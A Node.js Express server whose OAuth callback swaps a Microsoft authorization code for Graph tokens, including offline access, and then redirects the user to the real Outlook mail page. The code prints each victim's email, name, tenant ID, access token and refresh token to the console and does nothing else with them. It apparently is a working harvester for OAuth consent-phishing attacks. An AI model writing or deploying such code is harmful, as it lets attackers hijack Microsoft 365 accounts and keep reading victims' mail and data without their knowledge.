const express = require('express');
const axios = require('axios');
const qs = require('querystring');
const jwt = require('jsonwebtoken');

const app = express();
const port = process.env.PORT || 3000;

const config = {
  client_id: process.env.CLIENT_ID,
  client_secret: process.env.CLIENT_SECRET,
  redirect_uri: process.env.REDIRECT_URI,
  tenant_id: process.env.TENANT_ID
};

app.get('/oauth/callback', async (req, res) => {
  const authCode = req.query.code;
  if (!authCode) return res.send('No authorization code received.');

  const tokenEndpoint = `https://login.microsoftonline.com/${config.tenant_id}/oauth2/v2.0/token`;

  const body = {
    client_id: config.client_id,
    scope: 'https://graph.microsoft.com/.default offline_access openid profile email',
    code: authCode,
    redirect_uri: config.redirect_uri,
    grant_type: 'authorization_code',
    client_secret: config.client_secret
  };

  try {
    const tokenRes = await axios.post(tokenEndpoint, qs.stringify(body), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });

    const { access_token, refresh_token, id_token } = tokenRes.data;

    const decoded = jwt.decode(id_token);
    console.log('📧 Email (UPN):', decoded.preferred_username);
    console.log('🧑 Name:', decoded.name);
    console.log('🏢 Tenant ID:', decoded.tid);
    console.log('🔐 Access Token:', access_token);
    console.log('🔁 Refresh Token:', refresh_token);

    return res.redirect('https://outlook.office.com/mail/');
  } catch (err) {
    console.error('❌ Token exchange failed:', err.response?.data || err.message);
    res.send('Something went wrong.');
  }
});

app.listen(port, () => {
  console.log(`🚀 Server listening on port ${port}`);
});